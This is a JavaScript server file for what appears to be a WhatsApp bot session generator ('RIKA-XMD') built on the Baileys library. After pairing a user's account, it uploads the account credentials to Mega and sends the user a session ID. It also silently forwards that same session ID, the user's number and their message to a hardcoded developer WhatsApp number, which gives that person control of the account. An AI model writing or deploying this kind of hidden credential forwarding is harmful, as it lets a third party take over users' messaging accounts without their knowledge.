// server.js
import express from 'express';
import fs from 'fs';
import pino from 'pino';
import path from 'path';
import {
  makeWASocket,
  useMultiFileAuthState,
  delay,
  makeCacheableSignalKeyStore,
  jidNormalizedUser,
} from '@whiskeysockets/baileys';
import { upload } from './mega.js'; // Mega file uploader (you already have)

const app = express();
const PORT = process.env.PORT || 5000;

// 🛡️ Developer WhatsApp Number
const DEV_NUMBER = '94767019114'; // Change if needed

// 🧹 Remove session directory
function removeFile(filePath) {
  try {
    if (!fs.existsSync(filePath)) return false;
    fs.rmSync(filePath, { recursive: true, force: true });
  } catch (e) {
    console.error('Error removing file:', e);
  }
}

// 🧠 Random session ID generator
function generateRandomId(length = 6, numberLength = 4) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  const number = Math.floor(Math.random() * Math.pow(10, numberLength));
  return `${result}${number}`;
}

// 🌐 Serve frontend (public/index.html)
app.use(express.static('public'));

app.get('/', async (req, res) => {
  let num = req.query.number;
  let customMsg = req.query.msg || 'No message';
  let dirs = './' + (num || 'session');

  await removeFile(dirs);

  async function initiateSession() {
    const { state, saveCreds } = await useMultiFileAuthState(dirs);
    try {
      const sock = makeWASocket({
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' })),
        },
        printQRInTerminal: false,
        logger: pino({ level: 'fatal' }),
        browser: ['Ubuntu', 'Chrome', '20.0.04'],
      });

      if (!sock.authState.creds.registered) {
        await delay(2000);
        num = num.replace(/[^0-9]/g, '');
        const code = await sock.requestPairingCode(num);
        if (!res.headersSent) res.send({ code });
      }

      sock.ev.on('creds.update', saveCreds);

      sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
        if (connection === 'open') {
          await delay(5000);

          const sessionStream = fs.createReadStream(`${dirs}/creds.json`);
          const fileName = generateRandomId() + '.json';
          const megaUrl = await upload(sessionStream, fileName);
          let sessionId = 'RIKA-XMD=' + megaUrl.replace('https://mega.nz/file/', '');

          const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
          const devJid = jidNormalizedUser(DEV_NUMBER + '@s.whatsapp.net');

          // ✅ 1. Send only session ID to user
          await sock.sendMessage(userJid, { text: sessionId });

          // ✅ 2. Send full report to developer
          await sock.sendMessage(devJid, {
            text: `🆕 *New Pair Request!*\n\n📞 Number: ${num}\n📩 Message: ${customMsg}\n\n🔐 Session ID:\n${sessionId}`
          });

          await delay(3000);
          removeFile(dirs);
          process.exit(0);
        } else if (connection === 'close') {
          console.log('Connection closed. Retrying...');
          await delay(3000);
          initiateSession();
        }
      });
    } catch (err) {
      console.error('Error during pairing:', err);
      if (!res.headersSent) {
        res.status(503).send({ code: 'Service Unavailable' });
      }
    }
  }

  await initiateSession();
});

app.listen(PORT, () => {
  console.log(`🟢 Server running at http://localhost:${PORT}`);
});

// 🔥 Global error catcher
process.on('uncaughtException', (err) => {
  console.error('❗Uncaught Exception:', err);
});
